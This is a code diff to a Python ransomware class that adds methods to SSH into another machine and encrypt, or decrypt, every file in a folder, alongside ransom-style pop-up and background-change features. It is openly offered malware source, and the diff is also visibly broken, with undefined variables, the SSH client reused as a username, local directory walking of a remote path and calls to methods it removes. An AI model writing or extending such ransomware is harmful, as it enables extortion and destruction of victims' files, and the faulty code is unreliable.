@@ -24,25 +24,55 @@ class Ransomware:
             write_key()
         self.key = load_key()
 
-    # Encrypt files using the Fernet symmetric key
-    def encrypt_file(self):
-        file_path = input("Enter the path of the file you want to encrypt: ")
-        with open(file_path, "rb") as f:
-            data = f.read()
-        fernet = Fernet(self.key)
-        encrypted = fernet.encrypt(data)
-        with open(file_path, "wb") as f:
-            f.write(encrypted)
+    # Encrypt all files in a folder on a different VM
+    def encrypt_folder_on_vm(self, target_vm_ip, folder_path):
+        # Establish an SSH connection with the target VM
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(target_vm_ip, username=ssh, password=word)
+
+        # Iterate over the files in the folder on the target VM and encrypt them
+        sftp = ssh.open_sftp()
+        for root, dirs, files in os.walk(folder_path):
+            for file in files:
+                file_path = os.path.join(root, file)
+                with sftp.open(file_path, 'rb') as f:
+                    data = f.read()
+
+                fernet = Fernet(self.key)
+                encrypted = fernet.encrypt(data)
+
+                with sftp.open(file_path, 'wb') as f:
+                    f.write(encrypted)
+
+        # Close the SSH connection
+        sftp.close()
+        ssh.close()
 
     # Decrypt files using the Fernet symmetric key
-    def decrypt_file(self):
-        file_path = input("Enter the path of the file you want to decrypt: ")
-        with open(file_path, "rb") as f:
-            data = f.read()
-        fernet = Fernet(self.key)
-        decrypted = fernet.decrypt(data)
-        with open(file_path, "wb") as f:
-            f.write(decrypted)
+ def decrypt_folder_on_vm(self, target_vm_ip, folder_path):
+        # Establish an SSH connection with the target VM
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(target_vm_ip, username=ssh, password=word)
+
+        # Iterate over the files in the folder on the target VM and decrypt them
+        sftp = ssh.open_sftp()
+        for root, dirs, files in os.walk(folder_path):
+            for file in files:
+                file_path = os.path.join(root, file)
+                with sftp.open(file_path, 'rb') as f:
+                    data = f.read()
+
+                fernet = Fernet(self.key)
+                decrypted = fernet.decrypt(data)
+
+                with sftp.open(file_path, 'wb') as f:
+                    f.write(decrypted)
+
+        # Close the SSH connection
+        sftp.close()
+        ssh.close()
 
     # Change Background (modify for Linux)
     def change_background(self):
@@ -72,6 +102,8 @@ class Ransomware:
             user_input = input("What would you like to do? (Encrypt, Pop-up, Background, Decrypt, or Exit): ")
             if user_input.lower() == "encrypt":
                 # Encryption
+                ssh = input("Username: ")
+                word = input("Password: ")
                 self.encrypt_file()
 
             elif user_input.lower() == "pop-up":
@@ -84,6 +116,8 @@ class Ransomware:
 
             elif user_input.lower() == "decrypt":
                 # Decryption
+                ssh = input("Username: ")
+                word = input("Password: ")
                 self.decrypt_file()
 
             elif user_input.lower() == "exit":
